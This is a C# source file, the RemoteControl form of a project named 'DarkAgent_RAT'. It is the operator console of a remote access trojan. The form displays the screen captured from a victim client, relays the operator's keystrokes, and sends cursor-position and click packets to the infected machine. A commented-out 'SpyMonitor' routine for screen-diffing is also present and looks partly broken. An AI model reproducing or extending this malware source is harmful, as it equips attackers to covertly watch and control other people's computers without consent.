using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Drawing.Imaging;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Network.FileServer.Packets.Send;
using DarkAgent_RAT.src.Network.FileServer;

namespace DarkAgent_RAT
{
    public partial class RemoteControl : Form
    {
        public RemoteControl()
        {
            InitializeComponent();
        }

        public string RemoteIP;
        public string ClientName;
        public int ClientID;
        Point CursorPos = new Point();

        #region Speficic Events

        public void onRemoteControlScreen(object o, RemoteControlEventArgs e)
        {
            try
            {
                if(e.RemoteIP != RatClientProcessor.Instance._clientList[ClientID].FileServerRemoteIP)
                    return;

                this.pictureBox1.Image = e.ScreenImage;
            }
            catch {/* Key already exists at XX, networking is too fast ? lol */}
        }

        #endregion

        #region Other
        /*privateivate void SpyMonitor()
       {
           Bitmap last_bmp = ScreenCapture.CaptureScreen();
           while(true)
           {
               //Thread.Sleep(1000 / 30); //30fps

               Bitmap bmp = ScreenCapture.CaptureScreen();
               Bitmap final_bmp = bmp;

               BitmapData bmp1 = bmp.LockBits(new Rectangle(0,0,bmp.Width, bmp.Height), ImageLockMode.ReadOnly, bmp.PixelFormat);
               BitmapData bmp2 = last_bmp.LockBits(new Rectangle(0, 0, last_bmp.Width, last_bmp.Height), ImageLockMode.ReadOnly, last_bmp.PixelFormat);

               int byteCount = bmp.Width*bmp.Height*4;
               byte[] b1 = new byte[byteCount];
               byte[] b2 = new byte[byteCount];

               Marshal.Copy(bmp1.Scan0,b1, 0, (b1.Length / 4000));
               Marshal.Copy(bmp2.Scan0, b2, 0, (b2.Length / 4000));

               List<int> changedPixels = new List<int>();
               int pixelIndex = 0;

               for(int i=0;i<byteCount;i+=4)
               {
                   byte a1 = b1[i];
                   byte r1 = b1[i + 1];
                   byte g1 = b1[i + 2];
                   byte bl1 = b1[i + 3];

                   byte a2 = b2[i];
                   byte r2 = b2[i + 1];
                   byte g2 = b2[i + 2];
                   byte bl2 = b2[i + 3];
                   if(a1 != a2 || r1 != r2 || g1 != g2 || bl1 != bl2)
                   {
                       changedPixels.Add(pixelIndex);
                       changedPixels.Add(a2);
                       changedPixels.Add(r2);
                       changedPixels.Add(g2);
                       changedPixels.Add(bl2);
                   }
                   pixelIndex += 1;
               }

               bmp.UnlockBits(bmp1);
               last_bmp.UnlockBits(bmp2);

               for(int i=0;i<changedPixels.Count;i+=4)
               {
                   try
                   {
                       Point p = IntToPoint(changedPixels[i], bmp.Width);
                       byte a = (byte)changedPixels[i + 1];
                       byte r = (byte)changedPixels[i + 2];
                       byte g = (byte)changedPixels[i + 3];
                       byte b = (byte)changedPixels[i + 4];
                       final_bmp.SetPixel(p.X, p.Y, Color.FromArgb(a, r, g, b));
                   }
                   catch
                   {
                       //When screen is not focussed it will give a error here... dont know why
                   }
              }
               try
               {
                   Graphics gr = this.CreateGraphics();
                   gr.DrawImage(final_bmp, 0, 0, this.Width, this.Height);
                   this.Text = "DarkAgent - Remote Control - FileSize: " + string.Format("{0} KB", (this.Width * this.Height) / 10000);
                   gr.Dispose();
               }catch{}
           }
       }

       private Point IntToPoint(int value, int width)
       {
           int y = value / width;
           int x = value - (value / width);
           return new Point(x, y);
       }*/

        #endregion

        #region Form Events

        private void MonitorSpy_Load(object sender, EventArgs e)
        {
            this.Text = "DarkAgent - RemoteControl [" + RemoteIP.Split(':')[0] + "] [" + ClientName + "]";
            RemoteControlEvent.RemoteControl += new RemoteControlHandler(onRemoteControlScreen);
            if (FileClientProcessor.Instance._clientList.ContainsKey(ClientID))
                FileClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteControlScreen(FileClientProcessor.Instance._clientList[ClientID], 1));

            this.KeyPreview = true;
            this.KeyDown+= new KeyEventHandler(RemoteControl_KeyDown);
        }

        void RemoteControl_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.Shift)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteKeyboard(RatClientProcessor.Instance._clientList[ClientID], e.KeyCode.ToString().ToUpper()));
            else
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteKeyboard(RatClientProcessor.Instance._clientList[ClientID], e.KeyCode.ToString().ToLower()));
        }

        private void RemoteControl_FormClosing(object sender, FormClosingEventArgs e)
        {
            RemoteControlEvent.RemoteControl -= new RemoteControlHandler(onRemoteControlScreen);
            if (FileClientProcessor.Instance._clientList.ContainsKey(ClientID))
                FileClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteControlScreen(FileClientProcessor.Instance._clientList[ClientID], 0));
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                //CursorPos = new Point(((RatClientProcessor.Instance._clientList[ClientID].ScreenSize.X / RatClientProcessor.Instance._clientList[ClientID].ScreenSize.X) * e.X),
                //                      ((RatClientProcessor.Instance._clientList[ClientID].ScreenSize.Y / RatClientProcessor.Instance._clientList[ClientID].ScreenSize.Y) * e.Y));

                CursorPos = pictureBox1.PointToClient(Cursor.Position);

                this.Text = CursorPos.X + ", " + CursorPos.Y;
            }catch{}
        }

        #endregion

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_CursorPosition(RatClientProcessor.Instance._clientList[ClientID], CursorPos.X, CursorPos.Y));
        }
    }
}